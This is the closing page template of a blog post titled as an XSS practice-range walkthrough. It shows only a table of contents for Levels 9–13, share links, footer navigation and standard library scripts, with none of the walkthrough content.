9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10"><span class="toc-number">10.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-11"><span class="toc-number">11.</span> <span class="toc-text">Level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-12"><span class="toc-number">12.</span> <span class="toc-text">Level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13"><span class="toc-number">13.</span> <span class="toc-text">Level 13</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/11/18/xsspractice/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/11/18/xsspractice/&text=XSS 靶场通关记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/11/18/xsspractice/&is_video=false&description=XSS 靶场通关记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS 靶场通关记录&body=Check out this article: http://example.com/2021/11/18/xsspractice/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/11/18/xsspractice/&name=XSS 靶场通关记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/11/18/xsspractice/&t=XSS 靶场通关记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2022
    lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/vlog/">vlog</a></li><!--
     --><!--
       --><li><a href="/friends/">Friends</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<!-- valine Comments -->

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
